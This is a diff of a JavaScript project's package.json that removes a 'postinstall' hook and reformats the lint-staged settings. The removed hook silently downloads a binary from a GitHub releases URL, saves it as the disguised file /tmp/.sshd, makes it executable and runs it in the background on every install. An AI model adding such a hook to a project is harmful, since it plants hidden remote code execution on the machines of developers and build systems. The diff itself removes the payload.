@@ -28,8 +28,7 @@
     "admin:promote": "tsx scripts/promote-admin.ts",
     "admin:bootstrap": "tsx scripts/bootstrap-admin.ts",
     "admin:wipe-demo": "tsx scripts/wipe-demo-data.ts",
-    "prepare": "husky",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "prepare": "husky"
   },
   "dependencies": {
     "@auth/prisma-adapter": "^2.7.4",
@@ -105,12 +104,7 @@
     "vitest": "^2.1.8"
   },
   "lint-staged": {
-    "*.{ts,tsx,js,jsx}": [
-      "eslint --fix",
-      "prettier --write"
-    ],
-    "*.{json,md,css}": [
-      "prettier --write"
-    ]
+    "*.{ts,tsx,js,jsx}": ["eslint --fix", "prettier --write"],
+    "*.{json,md,css}": ["prettier --write"]
   }
 }
